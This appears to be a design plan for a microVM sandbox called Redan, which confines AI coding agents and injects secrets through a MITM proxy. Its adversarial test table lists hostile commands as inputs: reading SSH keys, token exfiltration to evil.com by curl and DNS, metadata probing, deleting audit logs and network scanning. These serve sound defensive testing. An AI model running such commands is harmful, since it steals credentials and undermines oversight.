# 9. Prototype Plan

*Revised per oracle reviews. Expanded spikes, added PS-6 adversarial suite, 4-week schedule.*

## 9.1 Spike Overview

Six spikes, ordered by dependency and risk retirement.

```
PS-1: libkrun + network interception + raw IP blocking
  ↓ (determines networking approach — GATING SPIKE)
PS-2: virtio-fs performance + symlink traversal ←── parallel with PS-1
  ↓
PS-3: agent transparency (depends on PS-1 + PS-2)
  ↓
PS-4: MITM proxy + CA + Host validation + response scrubbing (depends on PS-1)
  ↓
PS-5: end-to-end secret flow (depends on PS-4)
  ↓
PS-6: adversarial test suite (depends on PS-4 + PS-5)
```

---

## PS-1: libkrun VM Boot + Network Interception (GATING)

**Question:** Can we boot a libkrun microVM, intercept guest TCP connections at the host, and do it fast enough?

**What to build:**
- Rust binary: create libkrun VM context, boot minimal Linux image
- Configure TSI networking, attempt to intercept a TCP connection
- If TSI doesn't allow interception: try passt/gvproxy mode (virtio-net)
- Test raw IP connection blocking (guest connects to IP, verify host drops it)
- Test IPv6 blocking (::1, fe80::, fc00::)
- Measure boot time (target: <500ms)
- Test on BOTH Linux x86_64 AND macOS aarch64
- Evaluate OCI image handling: test `oci-distribution` crate or `skopeo`

**Success criteria:**
- VM boots on Linux and macOS
- Guest TCP connection routable through host process with destination visibility
- Raw IP connections blockable
- Boot time <500ms on both platforms

**Failure criteria:**
- Cannot intercept in any mode → **STOP. Architecture needs redesign.**
- Boot time >1s → warm pool required for MVP, not deferred
- macOS crashes → defer macOS to v1.0

**Time:** 5 days
**Risks retired:** R1 (TSI), R5 (macOS), R6 (boot time), R8 (OCI handling), R17 (raw IP)

---

## PS-2: virtio-fs Performance + Security

**Question:** Is virtio-fs fast enough for agent workflows, and can we prevent symlink traversal?

**What to build:**
- Mount a real project directory (10K-50K files) via virtio-fs
- Benchmark inside VM: `find`, `grep -r`, sequential read 100 files, write 100 files, `git status`
- Compare to host-native performance
- **Adversarial symlink test:** create project with `symlink → ~/.ssh/`, mount, verify guest CANNOT read through the symlink
- Test hardlinks and `..` traversal through mount boundary
- Test on both Linux and macOS

**Success criteria:**
- Overhead <2x for all operations
- `git status` <5s for 10K file repo
- Symlinks outside shared root: ENOENT or permission denied
- No data corruption

**Failure criteria:**
- Overhead >5x → need alternative (9p, copy-in)
- Symlink traversal works → **BLOCKER. Must fix before proceeding.**
- Data corruption → BLOCKER

**Time:** 3 days (parallel with PS-1)
**Risks retired:** R2 (virtio-fs perf), R14 (symlink traversal)

---

## PS-3: Agent Transparency

**Question:** Can Claude Code run transparently inside a libkrun microVM?

**What to build:**
- VM from PS-1/PS-2 with `node:22` image
- Install Claude Code, run basic coding task: "Create hello.py, run it, commit to git"
- Document everything that works and breaks
- Test interactive bash session (colors, tab completion, editors)
- Test git operations on mounted project directory
- Observe: what files does the agent try to access outside `/workspace`?
- Test with Codex (non-sandboxed mode) if time permits

**Success criteria:**
- Claude Code completes a basic coding task
- Interactive bash works (colors, cursor, PTY)
- Git operations work on virtio-fs mount

**Failure criteria:**
- Claude Code can't start → investigate, document blockers
- >50% of operations fail → Layer 1 may not be viable as primary

**Time:** 3-4 days
**Risks retired:** R3 (agent transparency), R12 (agent execution model)
**Dependencies:** PS-1, PS-2

---

## PS-4: MITM Proxy + Secret Injection

**Question:** Can we build a Rust MITM proxy that works with real package managers and validates Host headers?

**What to build:**
- Rust binary: `tokio` + `rustls` + `rcgen` + `hyper`
- Generate ephemeral CA on startup
- For TLS connections: extract SNI, generate leaf cert, terminate guest TLS
- Parse HTTP request via `hyper` (no custom parsing)
- Scan headers for placeholder tokens, replace with real value if destination matches
- **Host header validation:** verify HTTP `Host`/`:authority` matches TCP destination
- **Response header scrubbing:** scan response headers for injected values, replace with placeholder
- Install CA cert in guest trust store via `SSL_CERT_FILE` env var
- Auto-set `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO` in guest env
- Test with: `curl`, `npm install`, `pip install`, `cargo build`, `git clone`
- Test HTTP/2 (including CONTINUATION frame reassembly)
- Test WebSocket upgrade

**Success criteria:**
- MITM works for HTTPS traffic
- Placeholder replacement works in Authorization header
- npm, pip, cargo, git all work through proxy (accept ephemeral CA)
- Host header mismatch correctly blocked
- Response headers scrubbed for injected values
- Latency overhead <100ms per request

**Failure criteria:**
- Major package managers reject CA despite env vars → fall back to CONNECT proxy + env injection (weaker but functional)
- Latency >500ms → proxy architecture needs optimization
- HTTP/2 breaks → need more sophisticated proxy (extend timeline)

**Time:** 7 days (most complex spike)
**Risks retired:** R1 (MITM viability), R4 (CA compat), R19 (domain fronting), R20 (request smuggling)
**Dependencies:** PS-1

---

## PS-5: End-to-End Secret Flow

**Question:** Does the full lifecycle work: retrieve → inject → scrub → audit → zeroize?

**What to build:**
- Extend PS-4 with `env` secret backend
- Configure: `GITHUB_TOKEN` from env, inject for `api.github.com`
- Inside VM: `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user`
- Verify:
  - `echo $GITHUB_TOKEN` prints placeholder (not real token)
  - curl request succeeds (real token injected by proxy)
  - Response headers scrubbed if they contain the real token
  - Audit log (host-only path) shows: secret configured, injected, host allowed
- Test executable file detection: write `.git/hooks/pre-commit` inside VM, verify warning on teardown
- Test zeroization: dump host process memory after session, verify no secret residue
- Optional: HashiCorp Vault in dev mode as second backend

**Success criteria:**
- env backend: secret injected, API call succeeds, guest never sees real value
- Response header scrubbing works
- Audit log captures all events at host-only path
- Executable file modification detected and warned
- `zeroize` clears secrets from host memory on teardown

**Failure criteria:**
- Secret injection unreliable → architecture needs rethink
- Audit log missing events → fix before MVP

**Time:** 4 days
**Risks retired:** R9 (backend auth), R13 (git hooks detection), R15 (audit location), R18 (response reflection)
**Dependencies:** PS-4

---

## PS-6: Adversarial Test Suite (NEW)

**Question:** Can we break our own security model?

**What to build:**
- Automated test harness that boots a Redan session and attempts attacks
- Each test: expected result documented, automated pass/fail

**Test cases:**

| # | Attack | Expected Result |
|---|--------|-----------------|
| A1 | `cat /root/.ssh/id_ed25519` | ENOENT |
| A2 | `cat /workspace/symlink-to-ssh/id_ed25519` | ENOENT (symlink blocked) |
| A3 | `curl evil.com -d "$GITHUB_TOKEN"` | Connection dropped (evil.com not allowed) |
| A4 | `curl 93.184.216.34:443` | Connection dropped (raw IP blocked) |
| A5 | `curl api.github.com` with `Host: evil.com` | Blocked (Host mismatch) |
| A6 | `dig $(echo $GITHUB_TOKEN).evil.com` | DNS resolves, but only placeholder in query |
| A7 | `echo $GITHUB_TOKEN` | Prints placeholder, not real value |
| A8 | `curl http://169.254.169.254/` | Connection dropped (link-local blocked) |
| A9 | `curl http://[::1]:8080/` | Connection dropped (IPv6 localhost blocked) |
| A10 | Write `.git/hooks/pre-commit` | Redan warns on session teardown |
| A11 | `rm $XDG_STATE_HOME/redan/.../audit.jsonl` | ENOENT (audit log not in VM) |
| A12 | `env \| grep redan_ph_` | Shows placeholder names (known, documented) |
| A13 | `nmap 192.168.1.0/24` | All connections dropped (private range) |
| A14 | Modify `.github/workflows/deploy.yml` | Redan warns on session teardown |

**Success criteria:**
- All 14 tests pass
- Test harness runs in CI
- <5 minutes total execution time

**Failure criteria:**
- Any test in A1-A9 fails → security bug, fix immediately
- A10-A14 fail → warning mechanism broken, fix before MVP

**Time:** 3 days
**Risks retired:** Validates R13, R14, R17, R19 mitigations end-to-end
**Dependencies:** PS-4, PS-5

---

## 9.2 Schedule

```
Week 1:
├── PS-1: libkrun + networking + IP blocking (5 days)
└── PS-2: virtio-fs + symlinks (3 days, parallel)

Week 2:
├── PS-3: Agent transparency (3-4 days)
└── PS-4: MITM proxy start (begins after PS-1 networking confirmed)

Week 3:
├── PS-4: MITM proxy continued (7 days total)
├── PS-5: End-to-end secret flow (4 days, after PS-4)
└── PS-6: Adversarial tests start (after PS-5)

Week 4:
├── PS-6: Adversarial test suite complete (3 days)
└── Findings synthesis + architecture updates (2 days)
```

**Total: 4 weeks.** After spikes: review findings, update architecture, decide go/no-go on MVP implementation.

## 9.3 Spike Outputs

Each spike produces:
1. **Working code** in `spikes/ps-N/` (disposable prototype, not production)
2. **Findings document** in `docs/spikes/ps-N-findings.md`
3. **Go/no-go recommendation** for the approach it validates

## 9.4 Decision Gates

| After spike | Decision |
|-------------|----------|
| PS-1 | TSI or passt? macOS in MVP or deferred? |
| PS-2 | virtio-fs viable? Symlink protection works? |
| PS-3 | Layer 1 (env injection) viable for Claude Code? |
| PS-4 | MITM or CONNECT proxy? Which package managers work? |
| PS-5 | Secret injection model validated end-to-end? |
| PS-6 | Security model holds under adversarial testing? |

If PS-1 fails (no interception in any mode): **stop and reassess the entire architecture.**
If PS-4 partially fails: fall back to CONNECT proxy + env injection. Weaker but shippable.
